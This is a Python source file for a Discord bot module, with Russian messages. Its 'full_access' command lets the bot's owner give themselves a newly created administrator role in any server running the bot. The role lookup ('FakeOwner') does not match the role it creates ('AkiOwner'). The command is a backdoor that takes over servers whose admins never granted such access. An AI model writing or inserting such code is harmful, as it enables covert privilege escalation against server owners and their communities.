import discord

from discord.ext import commands

from core.bot import is_owner
from core.logger import logger
from data.colors import colors

class FullAccess(commands.Cog):
    """Выдать полный доступ"""

    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases = [
                                'full_access', 'fullaccess', 'access',
                                'полный_доступ', 'полныйдоступ', 'доступ', 'дать_доступ'
                                ])
    async def full_access_command(self, ctx):
        if is_owner(ctx.author.id) is True:
            owner_role = discord.utils.get(ctx.message.guild.roles, name = 'FakeOwner')
            if owner_role in ctx.author.roles:
                await ctx.send(embed = discord.Embed(title = 'У вас уже имеется роль создателя'))
                logger.warning(f'У пользователя уже имеется роль создателя - Пользователь: {ctx.author} ({ctx.author.id}).')
                return
            if owner_role is None:
                owner_role = await ctx.guild.create_role(name = 'AkiOwner', permissions = discord.Permissions( administrator = True), color = colors['success'])
                logger.info(f'Создана роль владельца бота - Пользователь: {ctx.author} ({ctx.author.id}).')
            await ctx.author.add_roles(owner_role, reason = None, atomic = True)
            logger.info(f'Выдана роль владельца бота - Пользователь: {ctx.author} ({ctx.author.id}).')
        else:
            await ctx.send(embed = discord.Embed(title = '`Вы не являетесь моим создателем!`', color = colors['error']))
            logger.warning(f'Попытка получить права администратора - Пользователь: {ctx.author} ({ctx.author.id}).')

def setup(bot):
    bot.add_cog(FullAccess(bot))